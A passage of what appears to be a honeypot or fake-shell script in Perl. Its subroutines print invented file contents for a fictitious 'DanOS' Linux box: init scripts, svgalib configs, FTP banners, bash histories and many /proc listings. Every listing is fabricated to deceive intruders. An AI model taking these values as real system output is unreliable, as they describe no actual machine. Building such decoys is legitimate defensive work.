# 
# XXXX note: as of 2.15, the autosave feature doesn't work if you are
# using the multiport feature; it doesn't save the multiport configuration
# (for now).  Autosave also doesn't work for the hayes devices.  
#Will fix later...
#
#

SETSERIAL=/sbin/setserial
RCLOCKFILE=/var/lock/subsys/serial


ALLDEVS="/dev/ttyS?"
if /bin/ls /dev/ttyS?? >& /dev/null ; then
	ALLDEVS="\$ALLDEVS /dev/ttyS??"
fi

#
# Handle System V init conventions...
#
case \$1 in
start)
EOT
}

sub cat_114
{
   # /etc/rc.d/rc.sysvinit
   print STDERR << "EOT"
#!/bin/sh
#
# rc.sysvinit   This file provides basic compatibility with SystemV style
#               startup scripts.  The SystemV style init system places 
#               start/stop scripts for each runlevel into directories such as
#               /etc/rc.d/rc3.d/ (for runlevel 3) instead of starting them
#               from /etc/rc.d/rc.M.  This makes for a lot more init scripts,
#               and a more complicated execution path to follow through if
#               something goes wrong.  For this reason, Slackware has always
#               used the traditional BSD style init script layout.
#
#               However, many binary packages exist that install SystemV
#               init scripts.  With rc.sysvinit in place, most well-written
#               startup scripts will work.  This is primarily intended to
#               support commercial software, though, and probably shouldn't
#               be considered bug free.
#
#               Written by Patrick Volkerding <volkerdi\@slackware.com>, 1999
#               from an example by Miquel van Smoorenburg <miquels\@cistron.nl>.

# Run an init script:
startup() {
  case "\$1" in
  *.sh)
    sh "\$\@"
    ;;
  *)
    "\$\@"
    ;;
  esac
EOT
}

sub cat_115
{
   # /etc/rc.d/rc.ids
   print STDERR << "EOT"

#!/bin/sh
#
# /etc/rc.d/rc.ids:  Local Intrusion Detection System initialization script.
#
# Put any local setup commands in here:

insmod /misc/ids/ids.o
EOT
}

sub cat_116
{
   # /etc/rc.d/init.d/ippl
   print STDERR << "EOT"
#!/bin/sh
#
#	This shell script takes care of starting and stopping
#       tcplog and icmplog.
#
# chkconfig: 345 45 45
# description:  These two programs let you log tcp and icmp connections in 
#		syslog, along with the hostname. They are just something 
#		whipped up quickly, and could be improved alot - especially 
#		the icmp logging program. 
#

# Source function library.
. /etc/rc.d/init.d/functions

# Source networking configuration.
. /etc/sysconfig/network

# Check that networking is up.
[ \${NETWORKING} = "no" ] && exit 0

# See how we were called.
case "\$1" in
  start)
	# Start daemons.
	echo -n "Starting ippl: "
	daemon ippl
        echo
	touch /var/lock/subsys/ippl
        ;;
EOT
}

sub cat_117
{
   # /etc/rc.d/init.d/postgresql
   print STDERR << "EOT"
#! /bin/sh
# postgresql	This is the init script for starting up the PostgreSQL
#		server
#
# chkconfig: 345 85 15
# description: Starts and stops the PostgreSQL backend daemon that handles \
#	       all database requests.
# description(pt_BR): Inicializa/p�ra o servidor PostgreSQL que trata todas as \
#              requisi��es ao banco de dados.
# processname: postmaster
# pidfile: /var/run/postmaster.pid
# 

# Source function library.
. /etc/rc.d/init.d/functions

# Get config.
. /etc/sysconfig/network

# Check that networking is up.
# Pretty much need it for postmaster.
[ \${NETWORKING} = "no" ] && exit 0

[ -f /usr/bin/postmaster ] || exit 0

# This script is slightly unusual in that the name of the daemon (postmaster)
# is not the same as the name of the subsystem (postgresql)

# See how we were called.
case "\$1" in
EOT
}

sub cat_118
{
   # /etc/rc.d/init.d/quake-server
   print STDERR << "EOT"
#!/bin/sh
# quake-server
# qui mai  7 16:15:54 EST 1998
#
# chkconfig: 345 98 10
# description: quake server
# description(pt_BR): Ativa/Desativa servidor quake
# processname: unixded
#
# seg nov  9 19:14:26 EDT 1998 - <aurelio\@conectiva.com.br>
# incrementado com reload, restart, inicializar, parar
# arrumado bug com o nome do processo

# Biblioteca de fun��es
. /etc/rc.d/init.d/functions

DIR_HOME=/usr/lib/quake
PROC_NAME=unixded
ARQ_PID=/var/run/\$PROC_NAME.pid
TXT_PROC_NAME='servidor quake'

case "\$1" in
  start|inicializar)
	cd \$DIR_HOME
	# deixe as '' pois � executado um eval para expandir a vari�vel
	daemon_cnc '/usr/sbin/\$PROC_NAME > /dev/null &'
	;;
  stop|parar)
	echo -n "Terminando \$TXT_PROC_NAME: "
	killproc \$PROC_NAME
EOT
}

sub cat_119
{
   # /etc/rc.d/init.d/sshd
   print STDERR << "EOT"
#!/bin/sh
#
# chkconfig: 345 55 45
# description: The sshd is the server part of the secure shell protocol \
#	       and allows ssh clients to connect to your host.
# description(pt_BR): sshd (servidor shell seguro) � o servidor do pacote ssh.
#	O ssh pode ser usado para login remoto, c�pia de arquivos remotos,
#	repasse de portas TCP, etc. Tamb�m oferece encripta��o e autentica��o
#	fortes.

. /etc/rc.d/init.d/functions

case "\$1" in
  start)
	echo -n "Inicializando sshd: "
	if test -r /var/run/sshd.pid && kill -0 `cat /var/run/sshd.pid`
	then echo "/var/run/sshd.pid existe, ent�o o sshd j� est� rodando."
	else /usr/sbin/sshd
		echo sshd
	fi
	touch /var/lock/subsys/sshd
	;;
  stop)
	echo -n "Parando sshd: "
	[ -f /var/run/sshd.pid ] || exit 0
	kill -TERM `cat /var/run/sshd.pid`
	rm -f /var/run/sshd.pid
	rm -f /var/lock/subsys/sshd
	echo "sshd"
	;;
EOT
}

sub cat_120
{
   # /etc/vga/dvorak-us.keymap
   print STDERR << "EOT"
# This is a svgalib scancode conversion map generated by svgakeymap.
# Read the file README.keymap from the svgalib distribution for more info.
#
# Physical keyboard layout: /usr/lib/kbd/keytables/dvorak.map.gz
# Program's expected keyboard layout: /usr/lib/kbd/keytables/us.map.gz
#
# physical_scancode program_scancode key_name
1 1 Escape
2 2 one
3 3 two
4 4 three
5 5 four
6 6 five
7 7 six
8 8 seven
9 9 eight
10 10 nine
11 11 zero
12 26 bracketleft
13 27 bracketright
14 14 Delete
15 15 Tab
16 40 apostrophe
17 51 comma
18 52 period
19 25 p
20 21 y
21 33 f
22 34 g
23 46 c
EOT
}

sub cat_121
{
   # /etc/vga/libvga.config
   print STDERR << "EOT"
# Configuration file for svgalib. Default location is /etc/vga.
# Other config file locations:	~/.svgalibrc
# 				where SVGALIB_CONFIG_FILE points
# Lines starting with '#' are ignored.

# If you have two vga cards with the same pci vendor id, svgalib will try
# to use the first one, even if the second one is active. In that case,
# use PCIStart to force starting the search for a vga card only at a
# specific bus and device numbers. For example, an AGP card is usually on
# bus 1, while pci is on bus 0, so to use the AGP card, uncomment:

# PCIStart 1 0

# Have a deep look at README.config to see what can do here (especially
# for mach32).

# Mouse type:

# mouse Microsoft	# Microsoft
# mouse MouseSystems	# Mouse Systems
# mouse MMSeries	# Logitech MM Series
# mouse Logitech	# Logitech protocol (old, newer mice use Microsoft protocol)
# mouse Busmouse	# Bus mouse
# mouse PS2		# PS/2 mouse
# mouse MouseMan	# Logitech MouseMan
# mouse Spaceball	# Spacetec Spaceball
# mouse IntelliMouse	# Microsoft IntelliMouse or Logitech MouseMan+ on serial port
# mouse IMPS2		# Microsoft IntelliMouse or Logitech MouseMan+ on PS/2 port
# mouse pnp		# plug'n'pray
# mouse WacomGraphire   # Wacom Graphire tablet/mouse
EOT
}

sub cat_122
{
   # /etc/vga/libvga.et4000
   print STDERR << "EOT"

/* ET4000 registers from SVGALIB 0.81 */

/* Define DAC_TYPE to force the DAC type used in the ET4000 driver. If it   */
/* is not defined, the driver tries to autodetect the DAC type which may go */
/* wrong. */

/*  Use the following values:
   0: Ordinary DAC
   1: Sierra SC11486 (32k)
   3: Sierra 32k/64k
   5: SS2410 15/24bit DAC
   9: AT&T 20c491/2 (32k/64k/24bit)
   17: Acumos ADAC (Cirrus Logic DAC)
   33: Sierra 15025/6 24-bit DAC
 */

#define DAC_TYPE 0

/* unsupported modes */
#define g320x200x64K_regs  DISABLE_MODE
#define g320x200x16M_regs  DISABLE_MODE
#define g800x600x16_regs   DISABLE_MODE
#define g1024x768x16_regs  DISABLE_MODE
#define g1280x1024x16_regs DISABLE_MODE


/* Got this mode from someone's tseng3.exe dump. */
/* ET4000 HiColor BIOS mode 0x13 -- 320x200x32K */
/* Video timing:        Vertical frequency   : 70.3Hz
EOT
}

sub cat_123
{
   # /etc/vga/libvga.et6000
   print STDERR << "EOT"
/* Copied temperaraly for et6000 till I figure out what should be here. */
/*			Don Secrest   */
/* The registers have been modified for ET6000. */
/* ET4000 registers from SVGALIB 0.81 */
/* \$Header: /home/don/prj/svga/svga1.2.10/et6000/RCS/et6000.regs,v 1.3 1998/04/07 03:00:38 don Exp don \$ */
/* Version \$Revision: 1.3 \$ \$Date: 1998/04/07 03:00:38 \$ \$RCSfile: et6000.regs,v \$ */
/* \$Log: et6000.regs,v \$
 * Revision 1.3  1998/04/07 03:00:38  don
 * Now all original color modes work including mode 19.
 *
 * Revision 1.2  1998/01/25 21:06:08  don
 * All registers are now correct except that for mode 19.
 *
 * Revision 1.1  1997/12/25 16:30:22  don
 * Initial revision
 * */

#define DAC_TYPE 0x40 /* ET6000 Has a built in DAC */
char et6000_regs_name[] = "\$Header: /home/don/prj/svga/svga1.2.10/et6000/RCS/et6000.regs,v 1.3 1998/04/07 03:00:38 don Exp don \$";
/* unsupported modes */
#define g320x200x64K_regs  DISABLE_MODE
#define g320x200x16M_regs  DISABLE_MODE
#define g800x600x16_regs   DISABLE_MODE
#define g1024x768x16_regs  DISABLE_MODE
#define g1280x1024x16_regs DISABLE_MODE


/* HiColor BIOS mode 0x13 -- 320x200x32K SVGA Mode 14 */
/* Video timing:        Vertical frequency   : 70.3Hz
   Horizontal frequency : 31.6KHz  */
EOT
}

sub cat_124
{
   # /etc/vga/null.keymap
   print STDERR << "EOT"
# This is a svgalib scancode conversion map generated by svgakeymap.
# Read the file README.keymap from the svgalib distribution for more info.
#
# Physical keyboard layout: /usr/lib/kbd/keytables/us.map.gz
# Program's expected keyboard layout: /usr/lib/kbd/keytables/us.map.gz
#
# physical_scancode program_scancode key_name
1 1 Escape
2 2 one
3 3 two
4 4 three
5 5 four
6 6 five
7 7 six
8 8 seven
9 9 eight
10 10 nine
11 11 zero
12 12 minus
13 13 equal
14 14 Delete
15 15 Tab
16 16 q
17 17 w
18 18 e
19 19 r
20 20 t
21 21 y
22 22 u
23 23 i
EOT
}

sub cat_125
{
   # /etc/msgs/mirrors.msg
   print STDERR << "EOT"
Welcome to the 'mirrors' directory.  All of the files in this
directory are copied from other systems in order to make them
more accessible to users (such as yourself).
EOT
}

sub cat_126
{
   # /etc/msgs/msg.dead
   print STDERR << "EOT"
You are not allowed to access %L.  Go away.
EOT
}

sub cat_127
{
   # /etc/msgs/msg.toomany
   print STDERR << "EOT"
Sorry, there are too many anonymous users using the system at this
time.  Please try again later.  There is currently a limit of %M
anonymous users.
EOT
}

sub cat_128
{
   # /etc/msgs/welcome.msg
   print STDERR << "EOT"
Welcome, archive user!  This is an experimental FTP server.  If have any
unusual problems, please report them via e-mail to root\@%L
If you do have problems, please try using a dash (-) as the first character
of your password -- this will turn off the continuation messages that may
be confusing your ftp client.
EOT
}

sub cat_129
{
   # /home/ftp/tmp/p00r.c
   print STDERR << "EOT"
EOT
}

sub cat_130
{
   # /home/joao/.bash_history
   print STDERR << "EOT"
exit
cd xxx
seejpeg loira01.jpg
seejpeg loira02.jpg
seejpeg loira03.jpg
seejpeg loira04.jpg
seempeg praia.mpg
exit
EOT
}

sub cat_131
{
   # /home/lorena/.bash_history
   print STDERR << "EOT"
wall recado.txt
exit
EOT
}

sub cat_132
{
   # /home/lorena/recado.txt
   print STDERR << "EOT"
Daniel, eu te amo !!!
EOT
}

sub cat_133
{
   # /home/daniel/.bash_history
   print STDERR << "EOT"
exit
EOT
}

sub cat_134
{
   # /home/bill/mail/sent-mail
   print STDERR << "EOT"
Mailbox clean
EOT
}

sub cat_135
{
   # /proc/cmdline
   print STDERR << "EOT"
BOOT_IMAGE=DanOS ro root=305
EOT
}

sub cat_136
{
   # /proc/cpuinfo
   print STDERR << "EOT"
processor	: 0
vendor_id	: CyrixInstead
cpu family	: 6
model		: 2
model name	: M II 3x Core/Bus Clock
stepping	: 8
cpu MHz		: 224.880925
fdiv_bug	: no
hlt_bug		: no
sep_bug		: no
f00f_bug	: no
coma_bug	: no
fpu		: yes
fpu_exception	: yes
cpuid level	: 1
wp		: yes
flags		: fpu de tsc msr cx8 mtrr pge cmov mmx
bogomips	: 224.46
EOT
}

sub cat_137
{
   # /proc/devices
   print STDERR << "EOT"
Character devices:
  1 mem
  2 pty
  3 ttyp
  4 ttyS
  5 cua
  7 vcs
 10 misc
 14 sound
 29 fb
 30 socksys
128 ptm
129 ptm
136 pts
137 pts

Block devices:
  1 ramdisk
  2 fd
  3 ide0
  7 loop
  9 md
 22 ide1
 43 nbd
EOT
}

sub cat_138
{
   # /proc/dma
   print STDERR << "EOT"
 1: SoundBlaster8
 4: cascade
 5: SoundBlaster16
EOT
}

sub cat_139
{
   # /proc/fb
   print STDERR << "EOT"
0 VESA VGA
EOT
}

sub cat_140
{
   # /proc/filesystems
   print STDERR << "EOT"
	ext2
	minix
	umsdos
	msdos
	vfat
nodev	proc
nodev	nfs
	iso9660
nodev	devpts
EOT
}

sub cat_141
{
   # /proc/interrupts
   print STDERR << "EOT"
           CPU0       
  0:    1699764          XT-PIC  timer
  1:     162356          XT-PIC  keyboard
  2:          0          XT-PIC  cascade
  4:       4754          XT-PIC  serial
  5:         13          XT-PIC  soundblaster
  8:          1          XT-PIC  rtc
  9:          1          XT-PIC  mpu401
 13:          0          XT-PIC  fpu
 14:     166440          XT-PIC  ide0
 15:      33496          XT-PIC  ide1
NMI:          0
EOT
}

sub cat_142
{
   # /proc/ioports
   print STDERR << "EOT"
0000-001f : dma1
0020-003f : pic1
0040-005f : timer
0060-006f : keyboard
0070-007f : rtc
0080-008f : dma page reg
00a0-00bf : pic2
00c0-00df : dma2
00f0-00ff : fpu
0170-0177 : ide1
01f0-01f7 : ide0
0220-022f : soundblaster
02e8-02ef : serial(auto)
02f8-02ff : serial(auto)
0330-0331 : mpu401
0376-0376 : ide1
03c0-03df : vga+
03f6-03f6 : ide0
03f8-03ff : serial(auto)
4000-4007 : ide0
4008-400f : ide1
EOT
}

sub cat_143
{
   # /proc/loadavg
   print STDERR << "EOT"
0.00 0.02 0.00 1/21 668
EOT
}

sub cat_144
{
   # /proc/locks
   print STDERR << "EOT"
EOT
}

sub cat_145
{
   # /proc/mdstat
   print STDERR << "EOT"
Personalities : [1 linear] [2 raid0]
read_ahead not set
md0 : inactive
md1 : inactive
md2 : inactive
md3 : inactive
EOT
}

sub cat_146
{
   # /proc/meminfo
   print STDERR << "EOT"
        total:    used:    free:  shared: buffers:  cached:
Mem:  29605888 26877952  2727936  9375744  3645440 17108992
Swap: 66023424   831488 65191936
MemTotal:     28912 kB
MemFree:       2664 kB
MemShared:     9156 kB
Buffers:       3560 kB
Cached:       16708 kB
SwapTotal:    64476 kB
SwapFree:     63664 kB
EOT
}

sub cat_147
{
   # /proc/misc
   print STDERR << "EOT"
135 rtc
  1 psaux
EOT
}

sub cat_148
{
   # /proc/modules
   print STDERR << "EOT"
mpu401                 18640   0
sb                     33236   0
uart401                 5872   0 [sb]
sound                  57176   0 [mpu401 sb uart401]
soundlow                 224   0 [sound]
soundcore               2116   6 [sb sound]
iBCS                  135456   3
pcmcia_core            39080   0
bsd_comp                3568   0 (unused)
ppp                    20428   0 [bsd_comp]
slhc                    4300   0 [ppp]
parport_pc              5588   0 (unused)
parport                 6724   0 [parport_pc]
EOT
}

sub cat_149
{
   # /proc/mounts
   print STDERR << "EOT"
/dev/root / ext2 rw 0 0
/dev/hda1 /mnt/w95 vfat rw 0 0
none /dev/pts devpts rw 0 0
none /proc proc rw 0 0
EOT
}

sub cat_150
{
   # /proc/mtrr
   print STDERR << "EOT"
reg00: base=0x000a0000 (   0MB), size= 128kB: write-combining, count=1
reg01: base=0x000c0000 (   0MB), size= 256kB: uncachable, count=1
reg03: base=0x000a0000 (   0MB), size=  64kB: write-combining, count=1
reg07: base=0x00000000 (   0MB), size=  32MB: write-back, count=1
EOT
}

sub cat_151
{
   # /proc/partitions
   print STDERR << "EOT"
major minor  #blocks  name

   3     0    2481696 hda
   3     1     923296 hda1
   3     2          1 hda2
   3     5    1491808 hda5
   3     6      64480 hda6
  22    64 1073741823 hdd
EOT
}

sub cat_152
{
   # /proc/sound
   print STDERR << "EOT"
OSS/Free:3.8s2++-971130
Load type: Driver loaded as a module
Kernel: DanOS localhost 2.2.13 #127 Thu Oct 21 13:13:20 CDT 1999 i686
Config options: 0

Installed drivers: 

Card config: 

Audio devices:
0: Sound Blaster 16 (4.13) (DUPLEX)

Synth devices:

Midi devices:
0: MPU-401 0.0  Midi interface #1

Timers:
0: System clock

Mixers:
0: Sound Blaster
EOT
}

sub cat_153
{
   # /proc/stat
   print STDERR << "EOT"
cpu  17034 0 43431 1639307
disk 8839 0 0 1
disk_rio 2990 0 0 1
disk_wio 5849 0 0 0
disk_rblk 23365 0 0 2
disk_wblk 46708 0 0 0
page 10097 11976
swap 19 405
intr 2066867 1699772 162356 0 0 4754 13 34 0 1 1 0 0 0 0 166440 33496 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0
ctxt 3353649
btime 980982085
processes 668
EOT
}

sub cat_154
{
   # /proc/swaps
   print STDERR << "EOT"
Filename			Type		Size	Used	Priority
/dev/hda6                       partition	64476	812	-1
EOT
}

sub cat_155
{
   # /proc/uptime
   print STDERR << "EOT"
16997.73 16393.07
EOT
}

sub cat_156
{
   # /proc/version
   print STDERR << "EOT"
DanOS version 2.2.13 (root\@zap) (gcc version egcs-2.91.66 19990314/DanOS (egcs-1.1.2 release)) #127 Thu Oct 21 13:13:20 CDT 1999
EOT
}

sub cat_157
{
   # /proc/98/cmdline
   print STDERR << "EOT"
-bash
EOT
}

sub cat_158
{
   # /proc/98/environ
   print STDERR << "EOT"
TERM=DanOS HZ=100 HOME=/root SHELL=/bin/bash PATH=/usr/local/sbin:/usr/local/bin:/sbin:/usr/sbin:/bin:/usr/bin USER=root LOGNAME=root MAIL=/var/spool/mail/root HUSHLOGIN=FALSE
EOT
}

sub cat_159
{
   # /proc/98/maps
   print STDERR << "EOT"
08048000-080ac000 r-xp 00000000 03:05 124438     /bin/bash
080ac000-080b2000 rw-p 00063000 03:05 124438     /bin/bash
080b2000-080d9000 rwxp 00000000 00:00 0
40000000-40012000 r-xp 00000000 03:05 31239      /lib/ld-2.1.2.so
40012000-40013000 rw-p 00011000 03:05 31239      /lib/ld-2.1.2.so
40013000-40016000 rw-p 00000000 00:00 0
4001a000-4001d000 r-xp 00000000 03:05 33247      /lib/libtermcap.so.2.0.8
4001d000-4001e000 rw-p 00002000 03:05 33247      /lib/libtermcap.so.2.0.8
4001e000-40020000 r-xp 00000000 03:05 31245      /lib/libdl-2.1.2.so
40020000-40021000 rw-p 00001000 03:05 31245      /lib/libdl-2.1.2.so
40021000-40102000 r-xp 00000000 03:05 31241      /lib/libc-2.1.2.so
40102000-40106000 rw-p 000e0000 03:05 31241      /lib/libc-2.1.2.so
40106000-40109000 rw-p 00000000 00:00 0
40109000-40112000 r-xp 00000000 03:05 31248      /lib/libnss_compat-2.1.2.so
40112000-40114000 rw-p 00008000 03:05 31248      /lib/libnss_compat-2.1.2.so
40114000-40125000 r-xp 00000000 03:05 31247      /lib/libnsl-2.1.2.so
40125000-40127000 rw-p 00010000 03:05 31247      /lib/libnsl-2.1.2.so
40127000-40129000 rw-p 00000000 00:00 0
bfffe000-c0000000 rwxp fffff000 00:00 0
EOT
}

sub cat_160
{
   # /proc/98/mem
   print STDERR << "EOT"
EOT
}

sub cat_161
{
   # /proc/98/stat
   print STDERR << "EOT"
98 (bash) S 1 98 98 1028 98 256 818 1338 564 3724 8 33 76 1405 0 0 0 0 3947 1802240 258 2147483647 134512640 134918515 3221225072 3221222640 1074529556 0 0 3686404 260128507 3223064418 23 0 17 0
EOT
}

sub cat_162
{
   # /proc/98/statm
   print STDERR << "EOT"
258 258 191 88 0 170 67
EOT
}

sub cat_163
{
   # /proc/98/status
   print STDERR << "EOT"
Name:	bash
State:	S (sleeping)
Pid:	98
PPid:	1
Uid:	0	0	0	0
Gid:	0	0	0	0
Groups:	0 1 2 3 4 6 10 11 100 
VmSize:	    1760 kB
VmLck:	       0 kB
VmRSS:	    1032 kB
VmData:	     188 kB
VmStk:	       8 kB
VmExe:	     400 kB
VmLib:	    1096 kB
SigPnd:	0000000000000000
SigBlk:	0000000000000000
SigIgn:	0000000000384004
SigCgt:	000000000f813efb
CapInh:	00000000fffffeff
CapPrm:	00000000fffffeff
CapEff:	00000000fffffeff
EOT
}

sub cat_164
{
   # /proc/bus/pccard/memory
   print STDERR << "EOT"
EOT
}

sub cat_165
{
   # /proc/bus/pci/devices
   print STDERR << "EOT"
0000	10395597	0	00000000	00000000	00000000	00000000	00000000	00000000	00000000
0008	10390008	0	00000000	00000000	00000000	00000000	00000000	00000000	00000000
0009	10395513	0	42044501	08c00165	8c215301	5a4020c1	00004001	00000000	00000000
00a0	10390200	0	ff400008	ffaf0000	0000f481	00000000	00000000	00000000	ffae8000
EOT
}

sub cat_166
{
   # /proc/bus/pci/00/00.0
   print STDERR << "EOT"
9�U  "   \@                                                                   ��4�`�    B        ��  ̀  ���         X���\@ \@         �D0        � ��                                                                                            
EOT
}

sub cat_167
{
   # /proc/bus/pci/00/01.0
   print STDERR << "EOT"
9      �                                                 �����   �� (   
�. 6  �����   �       �/�/                         a                                                                                                              
EOT
}

sub cat_168
{
   # /proc/bus/pci/00/01.1
   print STDERR << "EOT"
9U   Њ �� EBe�S!�� \@Z\@          C��               �    
 �                                                                                                                                                                                   
EOT
}

sub cat_169
{
   # /proc/bus/pci/00/14.0
   print STDERR << "EOT"
9   e       \@�  ����                  9  ���                                 ����                                                            ����                                                            ����                                      
EOT
}

sub cat_170
{
   # /proc/ide/drivers
   print STDERR << "EOT"
ide-floppy version 0.9
ide-cdrom version 4.54
ide-disk version 1.08
EOT
}

sub cat_171
{
   # /proc/net/arp
   print STDERR << "EOT"
IP address       HW type     Flags       HW address            Mask     Device
EOT
}

sub cat_172
{
   # /proc/net/dev
   print STDERR << "EOT"
Inter-|   Receive                                                |  Transmit
 face |bytes    packets errs drop fifo frame compressed multicast|bytes    packets errs drop fifo colls carrier compressed
    lo:   26130     425    0    0    0     0          0         0    26130     425    0    0    0     0       0          0
 dummy:       0       0    0    0    0     0          0         0        0       0    0    0    0     0       0          0
EOT
}

sub cat_173
{
   # /proc/net/dev_mcast
   print STDERR << "EOT"
EOT
}

sub cat_174
{
   # /proc/net/dev_stat
   print STDERR << "EOT"
00000000 00000000 00000000 00000000 00000000
EOT
}

sub cat_175
{
   # /proc/net/igmp
   print STDERR << "EOT"
Idx	Device    : Count Querier	Group    Users Timer	Reporter
1	lo        :     0      V2
				010000E0     1 0:FFE6103A		0
EOT
}

sub cat_176
{
   # /proc/net/ip_fwchains
   print STDERR << "EOT"
EOT
}

sub cat_177
{
   # /proc/net/ip_fwnames
   print STDERR << "EOT"
input ACCEPT 1 0 425 0 26130
forward ACCEPT 1 0 0 0 0
output ACCEPT 1 0 425 0 26130
EOT
}

sub cat_178
{
   # /proc/net/ip_masquerade
   print STDERR << "EOT"
Prc FromIP   FPrt ToIP     TPrt Masq Init-seq  Delta PDelta Expires (free=40960,40960,40960)                                   
EOT
}

sub cat_179
{
   # /proc/net/netlink
   print STDERR << "EOT"
sk       Eth Pid    Groups   Rmem     Wmem     Dump     Locks
c1eec6a0 0   0      00000000 0        0        00000000 0
EOT
}

sub cat_180
{
   # /proc/net/netstat
   print STDERR << "EOT"
TcpExt: SyncookiesSent SyncookiesRecv SyncookiesFailed EmbryonicRsts PruneCalled RcvPruned OfoPruned OutOfWindowIcmps LockDroppedIcmps
TcpExt: 0 0 0 0 0 0 0 0 0
EOT
}

sub cat_181
{
   # /proc/net/raw
   print STDERR << "EOT"
  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode                               
   0: 00000000:00FF 00000000:0000 07 00000000:00000000 00:00000000 00000000     0        0 274                                 
   1: 00000000:0001 00000000:0000 07 00000000:00000000 00:00000000 00000000     0        0 273                                 
   2: 00000000:0008 00000000:0000 07 00000000:00000000 00:00000000 00000000     0        0 272                                 
   3: 00000000:0001 00000000:0000 07 00000000:00000000 00:00000000 00000000     0        0 0                                   
   4: 00000000:0006 00000000:0000 07 00000000:00000000 00:00000000 00000000     0        0 0                                   
EOT
}

sub cat_182
{
   # /proc/net/route
   print STDERR << "EOT"
Iface	Destination	Gateway 	Flags	RefCnt	Use	Metric	Mask		MTU	Window	IRTT                                                       
lo	0000007F	00000000	0001	0	0	0	000000FF	0	0	0                                                                                 
EOT
}

sub cat_183
{
   # /proc/net/rt_cache
   print STDERR << "EOT"
Iface	Destination	Gateway 	Flags		RefCnt	Use	Metric	Source		MTU	Window	IRTT	TOS	HHRef	HHUptod	SpecDst                          
EOT
}

sub cat_184
{
   # /proc/net/snmp
   print STDERR << "EOT"
Ip: Forwarding DefaultTTL InReceives InHdrErrors InAddrErrors ForwDatagrams InUnknownProtos InDiscards InDelivers OutRequests OutDiscards OutNoRoutes ReasmTimeout ReasmReqds ReasmOKs ReasmFails FragOKs FragFails FragCreates
Ip: 1 64 425 0 0 0 0 0 18 425 0 0 0 0 0 0 0 0 0
Icmp: InMsgs InErrors InDestUnreachs InTimeExcds InParmProbs InSrcQuenchs InRedirects InEchos InEchoReps InTimestamps InTimestampReps InAddrMasks InAddrMaskReps OutMsgs OutErrors OutDestUnreachs OutTimeExcds OutParmProbs OutSrcQuenchs OutRedirects OutEchos OutEchoReps OutTimestamps OutTimestampReps OutAddrMasks OutAddrMaskReps
Icmp: 18 0 18 0 0 0 0 0 0 0 0 0 0 18 0 18 0 0 0 0 0 0 0 0 0 0
Tcp: RtoAlgorithm RtoMin RtoMax MaxConn ActiveOpens PassiveOpens AttemptFails EstabResets CurrEstab InSegs OutSegs RetransSegs InErrs OutRsts
Tcp: 0 0 0 0 4 0 0 0 0 389 389 0 0 2
Udp: InDatagrams NoPorts InErrors OutDatagrams
Udp: 0 18 0 18
EOT
}

sub cat_185
{
   # /proc/net/sockstat
   print STDERR << "EOT"
sockets: used 18
TCP: inuse 6 highest 11
UDP: inuse 0 highest 2
RAW: inuse 5 highest 5
EOT
}

sub cat_186
{
   # /proc/net/tcp
   print STDERR << "EOT"
  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode                               
   0: 00000000:0019 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 91                                  
   1: 00000000:008F 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 46                                  
   2: 00000000:006E 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 45                                  
   3: 00000000:006D 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 44                                  
   4: 00000000:0017 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 43                                  
   5: 00000000:0015 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 42                                  
EOT
}

sub cat_187
{
   # /proc/net/tr_rif
   print STDERR << "EOT"
if     TR address       TTL   rcf   routing segments
EOT
}

sub cat_188
{
   # /proc/net/udp
   print STDERR << "EOT"
  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode                               
EOT
}

sub cat_189
{
   # /proc/net/unix
   print STDERR << "EOT"
Num       RefCount Protocol Flags    Type St Inode Path
c1b82970: 00000000 00000000 00010000 0001 01    63 /dev/gpmctl
c1eeccc0: 00000000 00000000 00010000 0001 01    36 /dev/log
c1b82350: 00000001 00000000 00000000 0001 03    61 \@00000002
c1eec9b0: 00000001 00000000 00000000 0001 03    39 \@00000001
c0032640: 00000001 00000000 00000000 0001 03   109 \@00000004
c0032950: 00000001 00000000 00000000 0001 03   110 /dev/log
c1b82660: 00000001 00000000 00000000 0001 03    62 /dev/log
c1a32060: 00000001 00000000 00000000 0001 03    40 /dev/log
EOT
}

sub cat_190
{
   # /proc/net/wireless
   print STDERR << "EOT"
Inter-|sta|  Quality       |  Discarded packets
 face |tus|link level noise| nwid crypt  misc
EOT
}

sub cat_191
{
   # /proc/scsi/scsi
   print STDERR << "EOT"
Attached devices: none
EOT
}

sub cat_192
{
   # /proc/tty/drivers
   print STDERR << "EOT"
pty_slave            /dev/pts      137   0-255 pty:slave
pty_master           /dev/ptm      129   0-255 pty:master
pty_slave            /dev/pts      136   0-255 pty:slave
pty_master           /dev/ptm      128   0-255 pty:master
pty_slave            /dev/ttyp       3   0-255 pty:slave
pty_master           /dev/pty        2   0-255 pty:master
serial               /dev/cua        5  64-107 serial:callout
serial               /dev/ttyS       4  64-107 serial
/dev/tty0            /dev/tty0       4       0 system:vtmaster
/dev/ptmx            /dev/ptmx       5       2 system
/dev/console         /dev/console    5       1 system:console
/dev/tty             /dev/tty        5       0 system:/dev/tty
unknown              /dev/tty        4    1-63 console
EOT
}

sub cat_193
{
   # /proc/tty/ldiscs
   print STDERR << "EOT"
n_tty       0
ppp         3
EOT
}

sub cat_194
{
   # /root/.ICEauthority
   print STDERR << "EOT"
